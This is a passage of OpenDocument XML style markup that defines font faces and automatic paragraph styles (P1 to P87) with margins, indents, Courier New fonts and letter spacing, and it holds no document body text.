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OpenSymbol" svg:font-family="OpenSymbol"/>
    <style:font-face style:name="CourtierC" svg:font-family="CourtierC" style:font-family-generic="roman"/>
    <style:font-face style:name="CourtierCBold" svg:font-family="CourtierCBold" style:font-family-generic="roman"/>
    <style:font-face style:name="Times New Roman1" svg:font-family="'Times New Roman'" style:font-family-generic="roma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automatic-styles>
    <style:style style:name="P1" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:margin-left="0cm" fo:margin-right="0cm" fo:margin-top="0.199cm" fo:margin-bottom="0cm" style:contextual-spacing="false" fo:text-indent="1.251cm" style:auto-text-indent="false"/>
    </style:style>
    <style:style style:name="P2" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:margin-left="0cm" fo:margin-right="0cm" fo:margin-top="0.199cm" fo:margin-bottom="0cm" style:contextual-spacing="false" fo:text-indent="1.251cm" style:auto-text-indent="false"/>
      <style:text-properties style:font-name="Courier New"/>
    </style:style>
    <style:style style:name="P3" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:margin-left="0cm" fo:margin-right="0cm" fo:margin-top="0.199cm" fo:margin-bottom="0cm" style:contextual-spacing="false" fo:text-indent="0cm" style:auto-text-indent="false"/>
    </style:style>
    <style:style style:name="P4" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:margin-left="0cm" fo:margin-right="0cm" fo:margin-top="0.199cm" fo:margin-bottom="0cm" style:contextual-spacing="false" fo:text-indent="0cm" style:auto-text-indent="false">
        <style:tab-stops/>
      </style:paragraph-properties>
    </style:style>
    <style:style style:name="P5" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:margin-left="0cm" fo:margin-right="0cm" fo:margin-top="0.199cm" fo:margin-bottom="0cm" style:contextual-spacing="false" fo:text-indent="0cm" style:auto-text-indent="false"/>
      <style:text-properties style:font-name="Courier New"/>
    </style:style>
    <style:style style:name="P6" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:margin-left="0cm" fo:margin-right="0cm" fo:margin-top="0.199cm" fo:margin-bottom="0cm" style:contextual-spacing="false" fo:text-indent="0cm" style:auto-text-indent="false">
        <style:tab-stops/>
      </style:paragraph-properties>
      <style:text-properties style:font-name="Courier New"/>
    </style:style>
    <style:style style:name="P7" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:margin-left="0cm" fo:margin-right="0cm" fo:margin-top="0.199cm" fo:margin-bottom="0cm" style:contextual-spacing="false" fo:text-indent="0cm" style:auto-text-indent="false"/>
      <style:text-properties style:font-name="Courier New" officeooo:paragraph-rsid="00244bc6"/>
    </style:style>
    <style:style style:name="P8" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:margin-left="0cm" fo:margin-right="0cm" fo:margin-top="0.199cm" fo:margin-bottom="0cm" style:contextual-spacing="false" fo:text-indent="0cm" style:auto-text-indent="false"/>
      <style:text-properties style:font-name="Courier New" fo:font-size="10pt" style:font-size-asian="10pt" style:font-size-complex="10pt"/>
    </style:style>
    <style:style style:name="P9" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:margin-left="0cm" fo:margin-right="0cm" fo:margin-top="0cm" fo:margin-bottom="0cm" style:contextual-spacing="false" fo:text-indent="0cm" style:auto-text-indent="false"/>
    </style:style>
    <style:style style:name="P10" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:margin-left="0cm" fo:margin-right="0cm" fo:margin-top="0cm" fo:margin-bottom="0cm" style:contextual-spacing="false" fo:text-indent="0cm" style:auto-text-indent="false">
        <style:tab-stops/>
      </style:paragraph-properties>
      <style:text-properties officeooo:paragraph-rsid="0029539a"/>
    </style:style>
    <style:style style:name="P11" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:margin-left="0cm" fo:margin-right="0cm" fo:margin-top="0cm" fo:margin-bottom="0cm" style:contextual-spacing="false" fo:text-indent="0cm" style:auto-text-indent="false"/>
      <style:text-properties style:font-name="Courier New"/>
    </style:style>
    <style:style style:name="P12" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:margin-left="0cm" fo:margin-right="0cm" fo:margin-top="0cm" fo:margin-bottom="0cm" style:contextual-spacing="false" fo:text-indent="0cm" style:auto-text-indent="false">
        <style:tab-stops/>
      </style:paragraph-properties>
      <style:text-properties style:font-name="Courier New"/>
    </style:style>
    <style:style style:name="P13" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:margin-left="0cm" fo:margin-right="0cm" fo:margin-top="0cm" fo:margin-bottom="0cm" style:contextual-spacing="false" fo:text-indent="0cm" style:auto-text-indent="false">
        <style:tab-stops/>
      </style:paragraph-properties>
      <style:text-properties style:font-name="Courier New" officeooo:paragraph-rsid="002a1abf"/>
    </style:style>
    <style:style style:name="P14" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:margin-left="0cm" fo:margin-right="0cm" fo:margin-top="0cm" fo:margin-bottom="0cm" style:contextual-spacing="false" fo:text-indent="0cm" style:auto-text-indent="false"/>
      <style:text-properties style:font-name="Courier New" fo:language="en" fo:country="US"/>
    </style:style>
    <style:style style:name="P15" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:margin-left="0cm" fo:margin-right="0cm" fo:margin-top="0cm" fo:margin-bottom="0cm" style:contextual-spacing="false" fo:text-indent="0cm" style:auto-text-indent="false"/>
      <style:text-properties style:font-name="Courier New" fo:language="en" fo:country="US" officeooo:paragraph-rsid="0032383b"/>
    </style:style>
    <style:style style:name="P16" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:margin-left="0cm" fo:margin-right="0cm" fo:margin-top="0cm" fo:margin-bottom="0cm" style:contextual-spacing="false" fo:text-indent="0cm" style:auto-text-indent="false"/>
      <style:text-properties style:font-name="Courier New" fo:font-size="10pt" style:font-size-asian="10pt" style:font-size-complex="10pt"/>
    </style:style>
    <style:style style:name="P17" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:margin-left="0cm" fo:margin-right="0cm" fo:margin-top="0cm" fo:margin-bottom="0cm" style:contextual-spacing="false" fo:text-indent="0cm" style:auto-text-indent="false">
        <style:tab-stops/>
      </style:paragraph-properties>
      <style:text-properties style:font-name="Courier New" officeooo:rsid="002b0ea7" officeooo:paragraph-rsid="002b0ea7"/>
    </style:style>
    <style:style style:name="P18" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:margin-left="0cm" fo:margin-right="0cm" fo:margin-top="0cm" fo:margin-bottom="0cm" style:contextual-spacing="false" fo:text-indent="0cm" style:auto-text-indent="false">
        <style:tab-stops/>
      </style:paragraph-properties>
      <style:text-properties style:font-name="Courier New" officeooo:rsid="002b0ea7" officeooo:paragraph-rsid="002e030c"/>
    </style:style>
    <style:style style:name="P19" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:margin-left="0cm" fo:margin-right="0cm" fo:margin-top="0cm" fo:margin-bottom="0cm" style:contextual-spacing="false" fo:text-align="start" style:justify-single-word="false" fo:text-indent="0cm" style:auto-text-indent="false">
        <style:tab-stops/>
      </style:paragraph-properties>
      <style:text-properties style:font-name="Courier New" officeooo:rsid="002b0ea7" officeooo:paragraph-rsid="002b0ea7"/>
    </style:style>
    <style:style style:name="P20" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:margin-left="0cm" fo:margin-right="0cm" fo:margin-top="0cm" fo:margin-bottom="0cm" style:contextual-spacing="false" fo:text-indent="0cm" style:auto-text-indent="false"/>
      <style:text-properties style:font-name="Courier New" fo:letter-spacing="-0.018cm"/>
    </style:style>
    <style:style style:name="P21" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:margin-left="0cm" fo:margin-right="0cm" fo:margin-top="0cm" fo:margin-bottom="0cm" style:contextual-spacing="false" fo:text-indent="0cm" style:auto-text-indent="false"/>
      <style:text-properties style:font-name="Courier New" fo:letter-spacing="-0.018cm" officeooo:paragraph-rsid="0032383b"/>
    </style:style>
    <style:style style:name="P22" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:margin-left="0cm" fo:margin-right="0cm" fo:margin-top="0cm" fo:margin-bottom="0cm" style:contextual-spacing="false" fo:text-align="start" style:justify-single-word="false" fo:text-indent="0cm" style:auto-text-indent="false"/>
      <style:text-properties style:font-name="Courier New"/>
    </style:style>
    <style:style style:name="P23" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:margin-left="0cm" fo:margin-right="0cm" fo:margin-top="0cm" fo:margin-bottom="0cm" style:contextual-spacing="false" fo:text-indent="0cm" style:auto-text-indent="false"/>
      <style:text-properties style:font-name="Courier New" fo:letter-spacing="-0.007cm"/>
    </style:style>
    <style:style style:name="P24" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:margin-left="0cm" fo:margin-right="0cm" fo:margin-top="0cm" fo:margin-bottom="0cm" style:contextual-spacing="false" fo:text-indent="0cm" style:auto-text-indent="false"/>
      <style:text-properties style:font-name="Courier New" fo:font-weight="normal" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P25" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:margin-left="0cm" fo:margin-right="0cm" fo:margin-top="0cm" fo:margin-bottom="0cm" style:contextual-spacing="false" fo:text-indent="0cm" style:auto-text-indent="false">
        <style:tab-stops/>
      </style:paragraph-properties>
      <style:text-properties style:font-name="Courier New" officeooo:rsid="002e030c" officeooo:paragraph-rsid="002e030c"/>
    </style:style>
    <style:style style:name="P26" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:margin-left="0cm" fo:margin-right="0cm" fo:margin-top="0cm" fo:margin-bottom="0cm" style:contextual-spacing="false" fo:text-align="start" style:justify-single-word="false" fo:text-indent="0cm" style:auto-text-indent="false">
        <style:tab-stops/>
      </style:paragraph-properties>
      <style:text-properties style:font-name="Courier New" officeooo:rsid="002e030c" officeooo:paragraph-rsid="002e030c"/>
    </style:style>
    <style:style style:name="P27" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:margin-left="0cm" fo:margin-right="0cm" fo:margin-top="0cm" fo:margin-bottom="0cm" style:contextual-spacing="false" fo:text-align="start" style:justify-single-word="false" fo:text-indent="0cm" style:auto-text-indent="false"/>
    </style:style>
    <style:style style:name="P28" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:margin-left="0cm" fo:margin-right="0cm" fo:margin-top="0cm" fo:margin-bottom="0cm" style:contextual-spacing="false" fo:text-align="start" style:justify-single-word="false" fo:text-indent="0cm" style:auto-text-indent="false"/>
      <style:text-properties officeooo:paragraph-rsid="0032383b"/>
    </style:style>
    <style:style style:name="P29" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:margin-left="0cm" fo:margin-right="0cm" fo:margin-top="0cm" fo:margin-bottom="0cm" style:contextual-spacing="false" fo:text-indent="0cm" style:auto-text-indent="false"/>
      <style:text-properties fo:letter-spacing="-0.007cm"/>
    </style:style>
    <style:style style:name="P30" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:margin-left="0cm" fo:margin-right="0cm" fo:margin-top="0cm" fo:margin-bottom="0cm" style:contextual-spacing="false" fo:text-indent="0cm" style:auto-text-indent="false"/>
      <style:text-properties officeooo:paragraph-rsid="0032383b"/>
    </style:style>
    <style:style style:name="P31" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:margin-left="0cm" fo:margin-right="0cm" fo:margin-top="0cm" fo:margin-bottom="0cm" style:contextual-spacing="false" fo:text-indent="0cm" style:auto-text-indent="false"/>
      <style:text-properties fo:letter-spacing="-0.018cm"/>
    </style:style>
    <style:style style:name="P32" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:margin-left="0cm" fo:margin-right="0cm" fo:margin-top="0cm" fo:margin-bottom="0cm" style:contextual-spacing="false" fo:text-indent="0cm" style:auto-text-indent="false"/>
      <style:text-properties fo:letter-spacing="-0.021cm" officeooo:paragraph-rsid="0032383b"/>
    </style:style>
    <style:style style:name="P33" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:margin-left="0cm" fo:margin-right="0cm" fo:margin-top="0.101cm" fo:margin-bottom="0cm" style:contextual-spacing="false" fo:text-indent="0cm" style:auto-text-indent="false"/>
    </style:style>
    <style:style style:name="P34" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:margin-left="0cm" fo:margin-right="0cm" fo:margin-top="0.101cm" fo:margin-bottom="0cm" style:contextual-spacing="false" fo:text-indent="0cm" style:auto-text-indent="false"/>
      <style:text-properties fo:font-size="10pt" style:font-size-asian="10.5pt"/>
    </style:style>
    <style:style style:name="P35" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:margin-left="0cm" fo:margin-right="0cm" fo:margin-top="0.101cm" fo:margin-bottom="0cm" style:contextual-spacing="false" fo:text-indent="0cm" style:auto-text-indent="false">
        <style:tab-stops/>
      </style:paragraph-properties>
    </style:style>
    <style:style style:name="P36" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:margin-left="0cm" fo:margin-right="0cm" fo:margin-top="0.101cm" fo:margin-bottom="0cm" style:contextual-spacing="false" fo:text-indent="0cm" style:auto-text-indent="false">
        <style:tab-stops/>
      </style:paragraph-properties>
      <style:text-properties officeooo:paragraph-rsid="002164d7"/>
    </style:style>
    <style:style style:name="P37" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:margin-left="0cm" fo:margin-right="0cm" fo:margin-top="0.101cm" fo:margin-bottom="0cm" style:contextual-spacing="false" fo:text-indent="0cm" style:auto-text-indent="false"/>
      <style:text-properties style:font-name="Courier New"/>
    </style:style>
    <style:style style:name="P38" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:margin-left="0cm" fo:margin-right="0cm" fo:margin-top="0.101cm" fo:margin-bottom="0cm" style:contextual-spacing="false" fo:text-indent="0cm" style:auto-text-indent="false">
        <style:tab-stops/>
      </style:paragraph-properties>
      <style:text-properties style:font-name="Courier New"/>
    </style:style>
    <style:style style:name="P39" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:margin-left="0cm" fo:margin-right="0cm" fo:margin-top="0.101cm" fo:margin-bottom="0cm" style:contextual-spacing="false" fo:text-indent="0cm" style:auto-text-indent="false">
        <style:tab-stops/>
      </style:paragraph-properties>
      <style:text-properties style:font-name="Courier New" fo:language="en" fo:country="US"/>
    </style:style>
    <style:style style:name="P40" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:margin-left="0cm" fo:margin-right="0cm" fo:margin-top="0.101cm" fo:margin-bottom="0.101cm" style:contextual-spacing="false" fo:text-indent="0cm" style:auto-text-indent="false"/>
    </style:style>
    <style:style style:name="P41" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:margin-left="0cm" fo:margin-right="0cm" fo:margin-top="0.101cm" fo:margin-bottom="0.101cm" style:contextual-spacing="false" fo:text-indent="0cm" style:auto-text-indent="false">
        <style:tab-stops/>
      </style:paragraph-properties>
      <style:text-properties fo:font-weight="bold" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P42" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:margin-left="0cm" fo:margin-right="0cm" fo:margin-top="0.101cm" fo:margin-bottom="0.101cm" style:contextual-spacing="false" fo:text-indent="0cm" style:auto-text-indent="false">
        <style:tab-stops/>
      </style:paragraph-properties>
      <style:text-properties fo:font-weight="bold" officeooo:paragraph-rsid="0029e9c0" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P43" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:margin-left="0cm" fo:margin-right="0cm" fo:margin-top="0.101cm" fo:margin-bottom="0.101cm" style:contextual-spacing="false" fo:text-indent="0cm" style:auto-text-indent="false">
        <style:tab-stops/>
      </style:paragraph-properties>
    </style:style>
    <style:style style:name="P44" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:margin-left="0cm" fo:margin-right="0cm" fo:margin-top="0.101cm" fo:margin-bottom="0.101cm" style:contextual-spacing="false" fo:text-indent="0cm" style:auto-text-indent="false">
        <style:tab-stops/>
      </style:paragraph-properties>
      <style:text-properties officeooo:paragraph-rsid="0029e9c0"/>
    </style:style>
    <style:style style:name="P45" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:margin-left="0cm" fo:margin-right="0cm" fo:margin-top="0.101cm" fo:margin-bottom="0.101cm" style:contextual-spacing="false" fo:text-indent="0cm" style:auto-text-indent="false">
        <style:tab-stops/>
      </style:paragraph-properties>
      <style:text-properties officeooo:paragraph-rsid="002a1abf"/>
    </style:style>
    <style:style style:name="P46" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:margin-left="0cm" fo:margin-right="0cm" fo:margin-top="0.199cm" fo:margin-bottom="0.101cm" style:contextual-spacing="false" fo:text-indent="0cm" style:auto-text-indent="false">
        <style:tab-stops/>
      </style:paragraph-properties>
    </style:style>
    <style:style style:name="P47" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:margin-left="0cm" fo:margin-right="0cm" fo:margin-top="0.199cm" fo:margin-bottom="0cm" style:contextual-spacing="false" fo:text-indent="-0.026cm" style:auto-text-indent="false">
        <style:tab-stops/>
      </style:paragraph-properties>
    </style:style>
    <style:style style:name="P48" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:margin-left="0cm" fo:margin-right="0cm" fo:margin-top="0.199cm" fo:margin-bottom="0cm" style:contextual-spacing="false" fo:text-indent="-0.026cm" style:auto-text-indent="false">
        <style:tab-stops/>
      </style:paragraph-properties>
      <style:text-properties style:font-name="Courier New"/>
    </style:style>
    <style:style style:name="P49" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:margin-left="0cm" fo:margin-right="0cm" fo:margin-top="0cm" fo:margin-bottom="0cm" style:contextual-spacing="false" fo:text-indent="-0.026cm" style:auto-text-indent="false">
        <style:tab-stops/>
      </style:paragraph-properties>
      <style:text-properties style:font-name="Courier New"/>
    </style:style>
    <style:style style:name="P50" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:margin-left="0cm" fo:margin-right="0cm" fo:margin-top="0.199cm" fo:margin-bottom="0cm" style:contextual-spacing="false" fo:text-indent="0.025cm" style:auto-text-indent="false"/>
      <style:text-properties style:font-name="Courier New"/>
    </style:style>
    <style:style style:name="P51" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:margin-top="0.199cm" fo:margin-bottom="0cm" style:contextual-spacing="false" fo:text-align="center" style:justify-single-word="false"/>
    </style:style>
    <style:style style:name="P52" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:margin-left="0.847cm" fo:margin-right="0cm" fo:margin-top="0.199cm" fo:margin-bottom="0cm" style:contextual-spacing="false" fo:text-indent="-0.82cm" style:auto-text-indent="false">
        <style:tab-stops/>
      </style:paragraph-properties>
      <style:text-properties style:font-name="Courier New"/>
    </style:style>
    <style:style style:name="P53" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:margin-left="0cm" fo:margin-right="0cm" fo:margin-top="0.199cm" fo:margin-bottom="0cm" style:contextual-spacing="false" fo:text-indent="0.026cm" style:auto-text-indent="false"/>
      <style:text-properties style:font-name="Courier New"/>
    </style:style>
    <style:style style:name="P54" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:margin-left="0cm" fo:margin-right="0cm" fo:margin-top="0.199cm" fo:margin-bottom="0cm" style:contextual-spacing="false" fo:text-indent="0.926cm" style:auto-text-indent="false"/>
      <style:text-properties style:font-name="Courier New"/>
    </style:style>
    <style:style style:name="P55" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:margin-left="0cm" fo:margin-right="0cm" fo:margin-top="0.199cm" fo:margin-bottom="0cm" style:contextual-spacing="false" fo:text-indent="1.005cm" style:auto-text-indent="false"/>
      <style:text-properties style:font-name="Courier New"/>
    </style:style>
    <style:style style:name="P56" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:margin-left="0cm" fo:margin-right="0cm" fo:margin-top="0.199cm" fo:margin-bottom="0cm" style:contextual-spacing="false" fo:text-indent="0.979cm" style:auto-text-indent="false"/>
      <style:text-properties style:font-name="Courier New"/>
    </style:style>
    <style:style style:name="P57" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:margin-left="0cm" fo:margin-right="0cm" fo:margin-top="0.199cm" fo:margin-bottom="0cm" style:contextual-spacing="false" fo:text-indent="-0.023cm" style:auto-text-indent="false">
        <style:tab-stops/>
      </style:paragraph-properties>
      <style:text-properties style:font-name="Courier New"/>
    </style:style>
    <style:style style:name="P58" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:margin-left="0cm" fo:margin-right="-0.739cm" fo:margin-top="0cm" fo:margin-bottom="0cm" style:contextual-spacing="false" fo:text-indent="0cm" style:auto-text-indent="false"/>
      <style:text-properties style:font-name="Courier New"/>
    </style:style>
    <style:style style:name="P59" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:margin-left="0cm" fo:margin-right="-0.605cm" fo:margin-top="0.199cm" fo:margin-bottom="0cm" style:contextual-spacing="false" fo:text-indent="0cm" style:auto-text-indent="false"/>
      <style:text-properties style:font-name="Courier New"/>
    </style:style>
    <style:style style:name="P60" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:margin-left="0cm" fo:margin-right="-0.605cm" fo:margin-top="0cm" fo:margin-bottom="0cm" style:contextual-spacing="false" fo:text-indent="0cm" style:auto-text-indent="false"/>
      <style:text-properties style:font-name="Courier New"/>
    </style:style>
    <style:style style:name="P61" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:margin-left="0cm" fo:margin-right="0cm" fo:margin-top="0.101cm" fo:margin-bottom="0.101cm" style:contextual-spacing="false" fo:text-indent="0.023cm" style:auto-text-indent="false">
        <style:tab-stops/>
      </style:paragraph-properties>
    </style:style>
    <style:style style:name="P62" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:margin-left="0cm" fo:margin-right="0cm" fo:margin-top="0.199cm" fo:margin-bottom="0cm" style:contextual-spacing="false" fo:text-indent="1.229cm" style:auto-text-indent="false">
        <style:tab-stops/>
      </style:paragraph-properties>
      <style:text-properties officeooo:paragraph-rsid="002ce2e6"/>
    </style:style>
    <style:style style:name="P63" style:family="paragraph" style:parent-style-name="Standard" style:master-page-name="">
      <style:paragraph-properties fo:margin-left="-0.079cm" fo:margin-right="0cm" fo:margin-top="0.199cm" fo:margin-bottom="0cm" style:contextual-spacing="false" fo:text-align="justify" style:justify-single-word="false" fo:text-indent="-0.026cm" style:auto-text-indent="false" style:page-number="auto" fo:background-color="transparent" style:shadow="none">
        <style:tab-stops/>
        <style:background-image/>
      </style:paragraph-properties>
      <style:text-properties fo:font-size="10pt" style:font-size-asian="10.5pt"/>
    </style:style>
    <style:style style:name="P64" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:margin-left="0cm" fo:margin-right="-0.404cm" fo:margin-top="0cm" fo:margin-bottom="0cm" style:contextual-spacing="false" fo:text-indent="0cm" style:auto-text-indent="false"/>
      <style:text-properties style:font-name="Courier New" fo:letter-spacing="-0.007cm"/>
    </style:style>
    <style:style style:name="P65" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:margin-left="0cm" fo:margin-right="-0.404cm" fo:margin-top="0cm" fo:margin-bottom="0cm" style:contextual-spacing="false" fo:text-indent="0cm" style:auto-text-indent="false"/>
      <style:text-properties style:font-name="Courier New" fo:letter-spacing="-0.007cm" officeooo:paragraph-rsid="00244bc6"/>
    </style:style>
    <style:style style:name="P66" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:margin-left="0cm" fo:margin-right="-0.404cm" fo:margin-top="0cm" fo:margin-bottom="0cm" style:contextual-spacing="false" fo:text-indent="0cm" style:auto-text-indent="false"/>
      <style:text-properties style:font-name="Courier New" fo:letter-spacing="-0.007cm" fo:language="en" fo:country="US"/>
    </style:style>
    <style:style style:name="P67" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L1">
      <style:paragraph-properties fo:margin-top="0.199cm" fo:margin-bottom="0cm" style:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P68" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L3">
      <style:paragraph-properties fo:margin-top="0.199cm" fo:margin-bottom="0cm" style:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P69" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L4">
      <style:paragraph-properties fo:margin-top="0.199cm" fo:margin-bottom="0cm" style:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P70" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L5">
      <style:paragraph-properties fo:margin-top="0.199cm" fo:margin-bottom="0cm" style:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P71" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L6">
      <style:paragraph-properties fo:margin-top="0.199cm" fo:margin-bottom="0cm" style:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P72" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L7">
      <style:paragraph-properties fo:margin-top="0.199cm" fo:margin-bottom="0cm" style:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P73" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L8">
      <style:paragraph-properties fo:margin-top="0.199cm" fo:margin-bottom="0cm" style:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P74" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L9">
      <style:paragraph-properties fo:margin-top="0.199cm" fo:margin-bottom="0cm" style:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P75" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L10">
      <style:paragraph-properties fo:margin-top="0.199cm" fo:margin-bottom="0cm" style:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P76" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L11">
      <style:paragraph-properties fo:margin-top="0.199cm" fo:margin-bottom="0cm" style:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P77" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L1">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0cm" style:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P78" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L2">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0cm" style:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P79" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L4">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0cm" style:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P80" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L6">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0cm" style:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P81" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L7">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0cm" style:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P82" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0cm" style:contextual-spacing="false" fo:text-align="start" style:justify-single-word="false"/>
      <style:text-properties style:font-name="Courier New" fo:font-size="10pt" style:font-size-asian="10pt" style:font-size-complex="10pt"/>
    </style:style>
    <style:style style:name="P83" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:margin-left="0cm" fo:margin-right="0cm" fo:margin-top="0.199cm" fo:margin-bottom="0cm" style:contextual-spacing="false" fo:text-indent="0cm" style:auto-text-indent="false"/>
    </style:style>
    <style:style style:name="P84" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:margin-left="0cm" fo:margin-right="0cm" fo:margin-top="0.199cm" fo:margin-bottom="0cm" style:contextual-spacing="false" fo:text-indent="0cm" style:auto-text-indent="false"/>
      <style:text-properties style:font-name="Courier New" fo:font-size="10pt" style:font-size-asian="10pt" style:font-size-complex="10pt"/>
    </style:style>
    <style:style style:name="P85" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:margin-left="0cm" fo:margin-right="0cm" fo:margin-top="0.199cm" fo:margin-bottom="0cm" style:contextual-spacing="false" fo:text-indent="0cm" style:auto-text-indent="false"/>
      <style:text-properties officeooo:paragraph-rsid="00385109"/>
    </style:style>
    <style:style style:name="P86" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:margin-left="0cm" fo:margin-right="0cm" fo:margin-top="0.199cm" fo:margin-bottom="0cm" style:contextual-spacing="false" fo:text-indent="0cm" style:auto-text-indent="false"/>
      <style:text-properties fo:font-size="10pt" style:font-size-asian="10pt" style:font-size-complex="10pt"/>
    </style:style>
    <style:style style:name="P87" style:family="paragraph" style:parent-style-name="Standard">
